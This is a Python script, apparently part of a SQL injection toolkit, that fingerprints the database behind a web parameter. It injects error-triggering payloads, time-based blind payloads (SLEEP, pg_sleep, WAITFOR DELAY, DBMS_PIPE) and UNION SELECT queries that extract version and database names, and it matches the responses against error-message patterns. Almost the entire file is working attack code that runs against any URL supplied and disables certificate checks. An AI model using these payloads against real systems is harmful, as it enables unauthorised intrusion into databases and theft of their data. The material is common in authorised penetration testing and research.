#!/usr/bin/env python3
# Database Type Detection Module
# This module attempts to fingerprint the database using error messages and behavioral patterns

import sys
import re
import time
import random
import urllib.parse
import requests

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Database fingerprinting patterns
DB_PATTERNS = {
    "MySQL": [
        "SQL syntax.*MySQL", 
        "Warning.*mysql_.*", 
        "MySQLSyntaxErrorException",
        "valid MySQL result", 
        "check the manual that corresponds to your (MySQL|MariaDB) server version",
        "MySqlException",
        "MySqlClient\.",
        "com\.mysql\.jdbc",
        "Uncaught Error: Call to undefined function mysql_",
        "Zend_Db_(Adapter|Statement)_Mysqli_Exception"
    ],
    "PostgreSQL": [
        "PostgreSQL.*ERROR", 
        "Warning.*\\Wpg_.*", 
        "valid PostgreSQL result", 
        "Npgsql\\.",
        "PG::SyntaxError:",
        "org\\.postgresql\\.util\\.PSQLException",
        "ERROR:\\s\\ssyntax error at or near ",
        "ERROR: parser: parse error at or near"
    ],
    "Microsoft SQL Server": [
        "Driver.* SQL[\\-\\_\\ ]*Server", 
        "OLE DB.* SQL Server", 
        "(\\W|\\w)*SQL Server.*Driver", 
        "Warning.*mssql_.*", 
        "\\bSQL Server[^&lt;&quot;]+Driver",
        "\\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
        "Exception Details:.*\\WSystem\\.Data\\.SqlClient\\.",
        "System\\.Data\\.SqlClient\\.SqlException\\:",
        "Unclosed quotation mark after the character string",
        "mssql_query\\(\\)"
    ],
    "Oracle": [
        "\\bORA-[0-9][0-9][0-9][0-9]", 
        "Oracle error", 
        "Oracle.*Driver", 
        "Warning.*\\W(oci|ora)_", 
        "quoted string not properly terminated",
        "SQL command not properly ended",
        "OracleException",
        "Oracle\\.Net\\.Client",
        "java\\.sql\\.SQLException: ORA-"
    ],
    "SQLite": [
        "SQLite/JDBCDriver", 
        "SQLite\\.Exception", 
        "(Microsoft|System)\\.Data\\.SQLite\\.SQLiteException", 
        "Warning.*sqlite_.*",
        "\\[SQLITE_ERROR\\]",
        "SQLite3::query\\:",
        "SQLiteException",
        "System\\.Data\\.SQLite\\.SQLiteException"
    ],
    "IBM DB2": [
        "CLI Driver.*DB2", 
        "DB2 SQL error", 
        "\\bdb2_\\w+\\(",
        "SQLSTATE\\:\\[\\d+",
        "\\[IBM\\]\\[CLI Driver\\]\\[DB2/",
        "DB2Exception",
        "db2_exec\\("
    ]
}

# Time-based detection queries
TIME_BASED_QUERIES = {
    "MySQL": ["1' AND SLEEP(2) AND '1'='1", "1' AND BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')) AND '1'='1"],
    "PostgreSQL": ["1' AND pg_sleep(2) AND '1'='1", "1' AND (SELECT pg_sleep(2)) AND '1'='1"],
    "Microsoft SQL Server": ["1' WAITFOR DELAY '0:0:2' AND '1'='1", "1';WAITFOR DELAY '0:0:2'--"],
    "Oracle": ["1' AND (dbms_pipe.receive_message(('a'),2)) AND '1'='1", "1' AND 1=(SELECT CASE WHEN 1=1 THEN (DBMS_PIPE.RECEIVE_MESSAGE('a',2)) ELSE 1 END FROM DUAL) AND '1'='1"],
    "SQLite": ["1' AND 1=like('abc',upper(hex(randomblob(100000000/2))))--", "1' AND 1=like(repeat('a',1000),repeat('a',1000)||'%')--"]
}

# Special diagnostic queries to confirm database type
CONFIRM_QUERIES = {
    "MySQL": ["' UNION SELECT @@version,2,3,4--", "' UNION SELECT database(),2,3,4--"],
    "PostgreSQL": ["' UNION SELECT version(),2,3,4--", "' UNION SELECT current_database(),2,3,4--"],
    "Microsoft SQL Server": ["' UNION SELECT @@version,2,3,4--", "' UNION SELECT DB_NAME(),2,3,4--"],
    "Oracle": ["' UNION SELECT banner FROM v$version WHERE ROWNUM=1--", "' UNION SELECT SYS.DATABASE_NAME FROM dual--"],
    "SQLite": ["' UNION SELECT sqlite_version(),2,3,4--", "' UNION SELECT 1,2,3,4--"]
}

def detect_db_from_error(response_text):
    """Detect database type from error messages in response"""
    for db_type, patterns in DB_PATTERNS.items():
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return db_type, 0.8  # 80% confidence from error pattern
    return None, 0.0

def test_time_based(url, param, db_type, timeout=5):
    """Test if time-based queries for a specific DB cause delays"""
    if db_type not in TIME_BASED_QUERIES:
        return False
        
    queries = TIME_BASED_QUERIES[db_type]
    
    # First measure baseline response time
    start_time = time.time()
    try:
        normal_url = f"{url}{'&' if '?' in url else '?'}{param}=1"
        requests.get(normal_url, timeout=timeout, verify=False)
    except:
        pass
    baseline_time = time.time() - start_time
    
    # Test time-based queries
    for query in queries:
        try:
            encoded_query = urllib.parse.quote_plus(query)
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={encoded_query}"
            
            start_time = time.time()
            requests.get(test_url, timeout=timeout+3, verify=False)  # Longer timeout to catch the delay
            query_time = time.time() - start_time
            
            # If response time is significantly longer than baseline
            if query_time > (baseline_time + 1.5):
                return True
        except requests.exceptions.ReadTimeout:
            # Timeout likely means the time-based injection worked
            return True
        except:
            continue
            
    return False

def test_specific_queries(url, param, db_type, timeout=5):
    """Test database-specific diagnostic queries"""
    if db_type not in CONFIRM_QUERIES:
        return False
        
    queries = CONFIRM_QUERIES[db_type]
    success_count = 0
    
    for query in queries:
        try:
            encoded_query = urllib.parse.quote_plus(query)
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={encoded_query}"
            
            response = requests.get(test_url, timeout=timeout, verify=False)
            
            # Check if query executed successfully (look for version strings)
            if db_type == "MySQL" and re.search(r"\d+\.\d+\.\d+", response.text):
                success_count += 1
            elif db_type == "PostgreSQL" and re.search(r"PostgreSQL \d+\.\d+", response.text):
                success_count += 1
            elif db_type == "Microsoft SQL Server" and re.search(r"Microsoft SQL Server", response.text):
                success_count += 1
            elif db_type == "Oracle" and re.search(r"Oracle Database|Release \d+\.\d+\.\d+\.\d+", response.text):
                success_count += 1
            elif db_type == "SQLite" and re.search(r"\d+\.\d+\.\d+", response.text):
                success_count += 1
        except:
            continue
            
    return success_count > 0

def detect_database(url, param):
    """Master function to detect database type"""
    candidates = []
    
    # First, try to trigger and analyze error messages
    try:
        # Error-triggering payloads
        error_payloads = [
            "1'", 
            "1\"", 
            "1')", 
            "1\")", 
            "1` OR 1=1", 
            "1' OR '1'='1", 
            "' OR 1 -- -", 
            "1' AND 1=1 --"
        ]
        
        for payload in error_payloads:
            encoded_payload = urllib.parse.quote_plus(payload)
            test_url = f"{url}{'&' if '?' in url else '?'}{param}={encoded_payload}"
            
            response = requests.get(test_url, timeout=5, verify=False)
            
            db_type, confidence = detect_db_from_error(response.text)
            if db_type:
                candidates.append((db_type, confidence))
                # If we find a database match with high confidence, break early
                if confidence > 0.7:
                    break
    except Exception as e:
        print(f"Error in database detection: {e}")
    
    # If we have a likely candidate, confirm with time-based tests
    if candidates:
        # Sort by confidence level
        candidates.sort(key=lambda x: x[1], reverse=True)
        top_candidate, confidence = candidates[0]
        
        # Try to confirm with time-based and specific queries
        if test_time_based(url, param, top_candidate):
            confidence += 0.1
            
        if test_specific_queries(url, param, top_candidate):
            confidence += 0.1
            
        # If confidence is high enough, return the database type
        if confidence >= 0.5:
            return top_candidate
    
    # Test all database types with time-based detection if no clear candidate
    if not candidates:
        for db_type in TIME_BASED_QUERIES.keys():
            if test_time_based(url, param, db_type):
                return db_type
                
            if test_specific_queries(url, param, db_type):
                return db_type
    
    # If we couldn't determine the type, default to MySQL (most common)
    return "MySQL"

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 db_detector.py <url> <param>")
        sys.exit(1)
        
    url = sys.argv[1]
    param = sys.argv[2]
    
    db_type = detect_database(url, param)
    print(f"Detected database: {db_type}")
